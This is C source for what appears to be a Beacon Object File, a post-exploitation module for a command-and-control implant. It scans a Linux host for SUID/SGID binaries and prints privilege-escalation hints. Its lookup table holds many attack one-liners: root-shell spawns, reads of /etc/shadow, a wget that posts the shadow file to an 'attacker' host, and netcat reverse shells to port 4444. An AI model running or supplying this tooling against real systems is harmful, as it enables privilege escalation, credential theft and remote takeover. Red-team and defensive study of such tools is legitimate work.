/// suid_scan.c — BOF: Recursive SUID/SGID binary scanner with GTFOBins hints
/// Compile: gcc -c -o suid_scan.o suid_scan.c -include bof_api.h -Os -fPIC
/// Usage: execute bof suid_scan.o

// getdents64 record structure
struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

#define DT_DIR  4
#define DT_REG  8
#define DT_LNK  10

#define S_ISUID  04000
#define S_ISGID  02000
#define S_IXUSR  00100
#define S_IXGRP  00010
#define S_IXOTH  00001

// Known GTFOBins SUID escalation targets
typedef struct {
    const char *name;
    const char *hint;
} gtfobins_t;

static const gtfobins_t gtfobins[] = {
    {"bash",       "bash -p"},
    {"sh",         "sh -p"},
    {"dash",       "dash -p"},
    {"zsh",        "zsh"},
    {"csh",        "csh"},
    {"ksh",        "ksh"},
    {"env",        "env /bin/sh -p"},
    {"find",       "find . -exec /bin/sh -p \\;"},
    {"nmap",       "nmap --interactive -> !sh"},
    {"vim",        "vim -c ':!sh'"},
    {"vi",         "vi -c ':!sh'"},
    {"nano",       "nano -> ^R^X -> reset; sh 1>&0 2>&0"},
    {"less",       "less /etc/passwd -> !/bin/sh"},
    {"more",       "more /etc/passwd -> !/bin/sh"},
    {"man",        "man man -> !/bin/sh"},
    {"awk",        "awk 'BEGIN {system(\"/bin/sh\")}'"},
    {"perl",       "perl -e 'exec \"/bin/sh\";'"},
    {"python",     "python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"},
    {"python3",    "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"},
    {"ruby",       "ruby -e 'exec \"/bin/sh\"'"},
    {"lua",        "lua -e 'os.execute(\"/bin/sh\")'"},
    {"php",        "php -r 'system(\"/bin/sh\");'"},
    {"node",       "node -e 'child_process.spawn(\"/bin/sh\",{stdio:[0,1,2]})'"},
    {"cp",         "cp /bin/sh /tmp/sh && chmod +s /tmp/sh"},
    {"mv",         "mv /bin/sh /tmp/sh (overwrite protected binary)"},
    {"dd",         "LFILE=shadow && dd if=/etc/$LFILE"},
    {"tar",        "tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    {"zip",        "zip /tmp/t /etc/passwd -T --unzip-command='sh -c /bin/sh'"},
    {"gcc",        "gcc -wrapper /bin/sh,-p,-s ."},
    {"make",       "make -s --eval='$(shell /bin/sh -p)'"},
    {"docker",     "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    {"pkexec",     "pkexec /bin/sh (CVE-2021-4034)"},
    {"doas",       "doas /bin/sh"},
    {"sudo",       "sudo -l (check allowed commands)"},
    {"su",         "su - (needs password)"},
    {"mount",      "mount -o bind /bin/sh /usr/bin/target"},
    {"umount",     "umount -l"},
    {"chroot",     "chroot / /bin/sh -p"},
    {"strace",     "strace -o /dev/null /bin/sh -p"},
    {"ltrace",     "ltrace -b -L /bin/sh -p"},
    {"gdb",        "gdb -nx -ex '!sh' -ex quit"},
    {"screen",     "screen (old versions CVE-2017-5618)"},
    {"tmux",       "tmux (check socket permissions)"},
    {"wget",       "wget --post-file=/etc/shadow http://attacker/"},
    {"curl",       "curl file:///etc/shadow"},
    {"nc",         "nc -e /bin/sh attacker 4444"},
    {"ncat",       "ncat -e /bin/sh attacker 4444"},
    {"socat",      "socat stdin exec:/bin/sh"},
    {"ssh",        "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
    {"scp",        "scp -S /tmp/evil.sh x: ."},
    {"rsync",      "rsync -e 'sh -p' . localhost:/dev/null"},
    {"tee",        "echo data | tee /etc/crontab (file write)"},
    {"sed",        "sed -n '1e exec sh -p 1>&0' /dev/null"},
    {"ed",         "ed -> !/bin/sh"},
    {"ar",         "TF=$(mktemp -u); ar r $TF /etc/shadow; cat $TF"},
    {"base64",     "base64 /etc/shadow | base64 -d"},
    {"xxd",        "xxd /etc/shadow | xxd -r"},
    {"taskset",    "taskset 1 /bin/sh -p"},
    {"time",       "time /bin/sh -p"},
    {"timeout",    "timeout 5 /bin/sh -p"},
    {"nice",       "nice /bin/sh -p"},
    {"ionice",     "ionice /bin/sh -p"},
    {"start-stop-daemon", "start-stop-daemon -n x -S -x /bin/sh -- -p"},
    {"xargs",      "xargs -a /dev/null sh -p"},
    {(const char *)0, (const char *)0}
};

static const char *find_gtfobins_hint(const char *basename) {
    for (int i = 0; gtfobins[i].name; i++) {
        if (AxStrcmp(basename, gtfobins[i].name) == 0)
            return gtfobins[i].hint;
    }
    return (const char *)0;
}

// Extract basename from path
static const char *get_basename(const char *path) {
    const char *last = path;
    for (const char *p = path; *p; p++) {
        if (*p == '/') last = p + 1;
    }
    return last;
}

static int suid_count = 0;
static int sgid_count = 0;
static int gtfobins_count = 0;

static void scan_directory(const char *dirpath, int depth) {
    if (depth > 8) return;  // Max recursion depth

    int fd = AxOpenDir(dirpath);
    if (fd < 0) return;

    char dirbuf[8192];

    while (1) {
        int nread = AxReadDir(fd, dirbuf, sizeof(dirbuf));
        if (nread <= 0) break;

        int pos = 0;
        while (pos < nread) {
            struct linux_dirent64 *entry = (struct linux_dirent64 *)(dirbuf + pos);
            char *name = entry->d_name;

            // Skip . and ..
            if (name[0] == '.' && (name[1] == '\0' || (name[1] == '.' && name[2] == '\0'))) {
                pos += entry->d_reclen;
                continue;
            }

            char fullpath[1024];
            int dirlen = AxStrlen(dirpath);
            if (dirlen + 1 + AxStrlen(name) + 1 > 1024) {
                pos += entry->d_reclen;
                continue;
            }
            AxStrcpy(fullpath, dirpath);
            if (dirpath[dirlen - 1] != '/') {
                fullpath[dirlen] = '/';
                fullpath[dirlen + 1] = '\0';
            }
            AxStrcat(fullpath, name);

            // Recurse into directories
            if (entry->d_type == DT_DIR) {
                // Skip /proc, /sys, /dev, /run
                if (depth == 0) {
                    if (AxStrcmp(name, "proc") == 0 || AxStrcmp(name, "sys") == 0 ||
                        AxStrcmp(name, "dev") == 0 || AxStrcmp(name, "run") == 0 ||
                        AxStrcmp(name, "snap") == 0) {
                        pos += entry->d_reclen;
                        continue;
                    }
                }
                scan_directory(fullpath, depth + 1);
            }

            // Check files for SUID/SGID
            if (entry->d_type == DT_REG || entry->d_type == DT_LNK) {
                unsigned int mode = 0;
                long fsize = 0;
                unsigned int uid = 0, gid = 0;

                if (AxFileStat(fullpath, &mode, &fsize, &uid, &gid) == 0) {
                    int is_suid = (mode & S_ISUID) && (mode & (S_IXUSR | S_IXGRP | S_IXOTH));
                    int is_sgid = (mode & S_ISGID) && (mode & (S_IXUSR | S_IXGRP | S_IXOTH));

                    if (is_suid || is_sgid) {
                        const char *basename = get_basename(fullpath);
                        const char *hint = find_gtfobins_hint(basename);

                        char flags[16];
                        int fi = 0;
                        if (is_suid) { flags[fi++] = 'S'; flags[fi++] = 'U'; flags[fi++] = 'I'; flags[fi++] = 'D'; }
                        if (is_suid && is_sgid) { flags[fi++] = '+'; }
                        if (is_sgid) { flags[fi++] = 'S'; flags[fi++] = 'G'; flags[fi++] = 'I'; flags[fi++] = 'D'; }
                        flags[fi] = '\0';

                        if (hint) {
                            BeaconPrintf(CALLBACK_OUTPUT,
                                         "[!!] %-50s [%s] owner=%d  GTFOBins: %s\n",
                                         fullpath, flags, uid, hint);
                            gtfobins_count++;
                        } else {
                            BeaconPrintf(CALLBACK_OUTPUT,
                                         "     %-50s [%s] owner=%d\n",
                                         fullpath, flags, uid);
                        }

                        if (is_suid) suid_count++;
                        if (is_sgid) sgid_count++;
                    }
                }
            }

            pos += entry->d_reclen;
        }
    }

    AxCloseFile(fd);
}

void go(char *args, int args_len) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning for SUID/SGID binaries...\n");
    BeaconPrintf(CALLBACK_OUTPUT, "    [!!] = GTFOBins escalation candidate\n\n");

    suid_count = 0;
    sgid_count = 0;
    gtfobins_count = 0;

    // Scan standard binary directories first (fast)
    const char *fast_dirs[] = {
        "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin",
        "/bin", "/sbin", "/opt",
        (const char *)0
    };

    for (int i = 0; fast_dirs[i]; i++) {
        scan_directory(fast_dirs[i], 2);  // depth=2 to skip virtual fs skip logic
    }

    // Full filesystem scan for non-standard locations
    scan_directory("/home", 1);
    scan_directory("/tmp", 1);
    scan_directory("/var", 1);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Summary: %d SUID, %d SGID, %d GTFOBins candidates\n",
                 suid_count, sgid_count, gtfobins_count);
}
